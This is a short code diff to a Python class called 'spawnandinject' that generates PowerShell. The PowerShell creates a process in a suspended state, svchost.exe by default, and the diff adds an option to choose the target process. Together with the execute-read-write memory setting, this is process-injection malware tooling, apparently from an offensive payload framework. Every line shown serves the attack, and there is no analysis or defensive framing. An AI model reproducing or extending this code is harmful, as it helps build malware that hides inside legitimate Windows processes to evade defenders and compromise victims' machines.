@@ -5,6 +5,10 @@ class spawnandinject:
                 self.memoryPermission = '0x40'
             else:
                 self.memoryPermission = '0x20'
+        if 'target' in arguments:
+            self.target = arguments['target'].replace('\\','\\\\')
+        else:
+            self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
 
     def imports(self) -> list[str]:
         return []
@@ -95,7 +99,7 @@ $CloseHandle = Get-Delegate $WaitForSingleObjectAddr @([IntPtr])
 $startupInformation = $startupInformationType.GetConstructors().Invoke($null)
 $processInformation = $processInformationType.GetConstructors().Invoke($null)
 
-$cmd = [System.Text.StringBuilder]::new("C:\\Windows\\System32\\svchost.exe")
+$cmd = [System.Text.StringBuilder]::new("{self.target}")
 $result = $CreateProcess.Invoke($null, @($null, $cmd, $null, $null, $false, 0x4, [IntPtr]::Zero, $null, $startupInformation, $processInformation))
 
 # Obtain the required handles from the PROCESS_INFORMATION structure
